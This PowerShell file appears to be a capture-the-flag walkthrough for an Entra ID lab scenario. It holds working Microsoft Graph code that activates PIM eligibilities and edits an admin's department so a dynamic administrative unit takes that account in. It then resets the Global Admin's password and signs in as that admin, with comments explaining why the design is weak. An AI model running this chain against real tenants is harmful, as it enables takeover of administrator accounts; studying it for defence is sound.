<#
.SYNOPSIS
EntraGoat Scenario 5: Walkthrough solution step-by-step

.DESCRIPTION
________________________________________________________________________________________________________________________________________________
Scenario 5 - Department of Escalations - AU Ready for This?

Attack flow: 

1. The attacker starts as a support user (Sarah Connor) with no direct privileges.
She has an eligible membership in "HR Support Team" and an eligible ownership of "Regional HR Coordinators".

2. First, the attacker activates their eligible membership in the support team.
This grants them the "User Profile Administrator" custom role with microsoft.directory/users/basic/update permission.

3. Next, they activate their eligible ownership of the Regional HR Coordinators group.
As the owner, they can add themselves as a member of this privileged group.

4. The Regional HR Coordinators group has the Privileged Authentication Administrator role.
BUT - it's scoped to the "HR Department" Administrative Unit, which uses dynamic membership.

5. Here's the clever part: Using their user update permission, they change the Global Admin's department to "HR".
This triggers the AU's dynamic membership rule: (user.department -eq "HR").

6. The Global Admin is now automatically added to the HR Department AU.
Since the attacker's group has PAA role scoped to this AU, they can now reset the GA's password.

7. The attacker resets the Global Admin password and signs in to retrieve the flag.
A perfect chain of legitimate features leading to complete compromise.

- - - 

--> So... why does this work?
This attack exploits several design assumptions in Azure AD:

1. PIM Eligibility Chains: Eligible ownership allows self-service group management after activation.
   Combined with an eligible membership, it creates delayed privilege escalation paths.

2. Dynamic AU Membership: Dynamic rules evaluate in real-time based on user attributes.
   If you can modify attributes, you can manipulate AU membership.

3. Scoped Roles + Dynamic AUs: AU-scoped roles seem limited, but become powerful when
   you can control who enters the AU through attribute manipulation.

4. Basic Update Permission: The seemingly harmless "update user profile" permission
   becomes a weapon when combined with dynamic membership rules.

5. Trust in Attributes: The system trusts that department values are legitimate,
   but any user with update permission can change them.

Common scenarios where this happens:
- Help desk staff given "just" profile update permissions
- PIM used to grant temporary access without considering the implications
- Dynamic AUs created for convenience without considering attribute manipulation
- AU-scoped admin roles assumed to be "safe" due to limited scope

The attack is particularly dangerous because:
- Each step uses legitimate, auditable actions
- PIM activations appear as normal administrative tasks
- Attribute changes look like routine profile updates
- The permission chain is hard to visualize
________________________________________________________________________________________________________________________________________________

.NOTES
Requires: Get-MSGraphTokenWithUsernamePassword function from BARK (https://github.com/BloodHoundAD/BARK)
you must have the function/BARK toolkit loaded in PS memory to use this function but other tools (or Connect-MgGraph) can be used as well.
#>


# Step 1: Connect as sarah.connor
$UPN = "sarah.connor@[YOUR-TENANT-DOMAIN].onmicrosoft.com"
$tenantId = "[YOUR-TENANT-ID]"
$password = "GoatAccess!123"

$userToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $userToken.access_token -AsPlainText -Force)

$currentUser = Get-MgUser -Filter "userPrincipalName eq '$UPN'"

# Step 2a: Enumeration 
# what groups are we a member of (if any)?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Check PIM eligible group assignments - what kinds of eligibilities do we have?
$eligibilities = Invoke-MgGraphRequest -Method GET `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/eligibilitySchedules?`$filter=principalId eq '$($currentUser.Id)'"

$eligibilities.value | Select-Object accessId, @{n='GroupId';e={$_.groupId}}, @{n='Status';e={$_.status}}

# four eligible assignments for groups. Lets check the descriptions and roles for these groups
foreach ($elig in $eligibilities.value) {
    $group = Get-MgGroup -GroupId $elig.groupId
    Write-Host "$($elig.accessId) of group: $($group.DisplayName)"
    Write-Host "  Description: $($group.Description)"
    
    $roleAssignments = Invoke-MgGraphRequest -Method GET -Uri "https://graph.microsoft.com/beta/roleManagement/directory/roleAssignments?`$filter=principalId eq '$($group.Id)'&`$expand=roleDefinition"
    
    foreach ($assignment in $roleAssignments.value) {
        Write-Host "  Role: $($assignment.roleDefinition.displayName)" -ForegroundColor Cyan
    }
}

# Regional HR Coordinators have the PAA role!

# In the previous scenario (4), we had to leverage ownership manipulation to add ourselves to a privileged group and then reset the administrator password.
# lets activate it now and complete the scenario (right?) 

# Step 3a: Building the attack chain?

$regGroup = Get-MgGroup -Filter "displayName eq 'Regional HR Coordinators'"

# Activate eligible ownership of the "Regional HR Coordinators" group and add ourselves as members

<#
Note: The following step can also be done via the UI:
    1. entra.microsoft.com -> ID Governance -> Privileged Access Management -> My roles -> Groups
    2. Eligible assignments tab
    3. Click Activate on the wanted group -> fill Reason ("Password reset required for locked HR department user account") -> Activate.
    4. Wait ~ 30 seconds -> re-sign-in or refresh token; role shows as Active.
    5. pwn.

    Read the blog post for more details and pretty screenshots!
#>

$ownerActivationParams = @{
    accessId         = "owner"
    principalId      = $currentUser.Id
    groupId          = $regGroup.Id
    action           = "selfActivate"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{ 
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "Regional coordination tasks and stuff"
}

Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $ownerActivationParams -ContentType "application/json"

# wait for activations to complete - this may take a while

# Add ourselves to the group
$memberParams = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/users/$($currentUser.Id)"
}
New-MgGroupMemberByRef -GroupId $regGroup.Id -BodyParameter $memberParams  # if you get "Insufficient privileges" error, consider refreshing your token or waiting a bit more.

# what groups are we a member of NOW?
$groupIDs = Get-MgUserMemberOf -UserId $currentUser.Id -All
foreach ($groupID in $groupIDs) {
    Get-MgGroup -GroupId $groupID.Id
}

# Refresh token to get new permissions (not a must, as discussed in scenario 2 official blog post)
Disconnect-MgGraph

$newToken = Get-MSGraphTokenWithUsernamePassword -Username $UPN -Password $password -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $newToken.access_token -AsPlainText -Force)

# Step 4a: Executing the attack path?
# Lets find the admin user and try to reset its password
$adminUser = Get-MgUser -Filter "startswith(userPrincipalName, 'EntraGoat-admin-s5')"
$adminUser

$newPwd = "Pwn3d$(Get-Random -Max 9999)!"
Update-MgUser -UserId $adminUser.Id -PasswordProfile @{
    Password = $newPwd
    ForceChangePasswordNextSignIn = $false
}

# Update-MgUser_UpdateExpanded: Insufficient privileges to complete the operation. 
# Status: 403 (Forbidden)
# ErrorCode: Authorization_RequestDenied

<#
Why is that? we saw that we are members of a group with the PAA role, so why the error?

    Entra ID directory role assignments operate within defined scopes that determine where the role's permissions apply. 
    By default, all directory role assignments have a tenant-wide scope ("/"), but for granular delegation purposes, 
    you can constrain role assignments to specific Administrative Units (AUs), which limits the role's permissions to only the users,
    groups, and devices contained within that AU. Resources outside the AU remain completely out of scope for that role assignment. 
    In short, whenever we see a role which is assigned to a principal we have access to, we must verify its scope!
#>

# Step 2b: Enumerating the role assignments scope
$regGroupRoleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($regGroup.Id)'"
foreach ($assignment in $regGroupRoleAssignments) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId
    Write-Host "Role: $($roleDef.DisplayName)"
    Write-Host "Scoped to: $($assignment.DirectoryScopeId)" 
}

# Role: Privileged Authentication Administrator
# Scoped to: /administrativeUnits/[AU-ID]

# This means that the PAA group can only manage users in the that AU rather than all users organization-wide.

# Let's enumerate the AU
$auId = $regGroupRoleAssignments.DirectoryScopeId -replace '/administrativeUnits/',''
$au = Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId $auId
$au | Format-List *

# MembershipRule: (user.department -eq "HR")
# MembershipRuleProcessingState : On
# MembershipType                : Dynamic

# Dynamic membership for the AU is turned on so if we can change the department of a user, we can add them to this AU and have PAA role over them!

# But how can we change the department of a user? 
# well, for that we need a role with user management permissions. 
# we saw earlier that the HR Support Team group has the User Profile Administrator role; sounds like a good candidate to start from.


$supportGroup = Get-MgGroup -Filter "displayName eq 'HR Support Team'"

# don't forget to check its scope this time, ahh?
$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($supportGroup.Id)'"
foreach ($assignment in $roleAssignments) {
    $roleDef = Get-MgRoleManagementDirectoryRoleDefinition -UnifiedRoleDefinitionId $assignment.RoleDefinitionId
    Write-Host "Role: $($roleDef.DisplayName)" -ForegroundColor Cyan
    Write-Host "Scoped to: $($assignment.DirectoryScopeId)" -ForegroundColor Cyan
}

# Role: User Profile Administrator
# Scoped to: /   

# since it's a custom role, we have to check its permissions (aka Actions)
$customRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'User Profile Administrator'"
$customRole.RolePermissions.AllowedResourceActions

# "microsoft.directory/users/basic/update" - we can update user attributes!

# step 3b: Building the attack chain

<#
So just to recap - if we can:
    0. Activate ownership of the PAA group -> Add ourselves as members
    1. Activate membership in the support team -> Get user update permission
    2. Change the admin's department to HR -> They join the AU
    3. We have the PAA role over that AU -> Reset their password
#>

# Check the admin's current department
$adminDetails = Get-MgUser -UserId $adminUser.Id -Property Department, DisplayName
$adminDetails.Department


# activate eligible membership in the support team
$memberActivationParams = @{
    accessId         = "member"
    principalId      = $currentUser.Id
    groupId          = $supportGroup.Id
    action           = "selfActivate"
    scheduleInfo     = @{
        startDateTime = (Get-Date).ToUniversalTime().ToString("o")
        expiration    = @{ 
            type = "afterDuration"
            duration = "PT8H"
        }
    }
    justification    = "User profile updates required for support tickets"
}


Invoke-MgGraphRequest -Method POST `
    -Uri "https://graph.microsoft.com/beta/identityGovernance/privilegedAccess/group/assignmentScheduleRequests" `
    -Body $memberActivationParams -ContentType "application/json"


# now, let's change the admin's department attribute to HR and check if that worked
Update-MgUser -UserId $adminUser.Id -Department "HR"

(Get-MgUser -UserId $adminUser.Id -Property Department).Department

# HR

# Step 4a: Executing the attack path
# wait for AU dynamic membership to process and check if admin is now in the AU
$auMembers = Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId $au.Id
$auMembers | Where-Object { $_.Id -eq $adminUser.Id }  # if empty, wait a bit.. dynamic membership can take a few MINUTES to process


# Reset the password using the PAA role
$newPwd = "Pwn3d$(Get-Random -Max 9999)!"
Update-MgUser -UserId $adminUser.Id -PasswordProfile @{
    Password = $newPwd
    ForceChangePasswordNextSignIn = $false
}

# Step 5: Log in as admin and retrieve the flag
Disconnect-MgGraph

$adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPwd -TenantID $tenantId
Connect-MgGraph -AccessToken (ConvertTo-SecureString $adminToken.access_token -AsPlainText -Force)

# gimme the flag!
Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userPrincipalName,onPremisesExtensionAttributes' |
    Select-Object @{n='UPN';e={$_.userPrincipalName}},
                  @{n='Id';e={$_.id}},
                  @{n='Flag';e={$_.onPremisesExtensionAttributes.extensionAttribute1}}

# Disconnect admin session
Disconnect-MgGraph


# Don't forget to run the cleanup script to restore the tenant to its original state!
# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing its source code.

# Official blog post: https://www.semperis.com/blog/
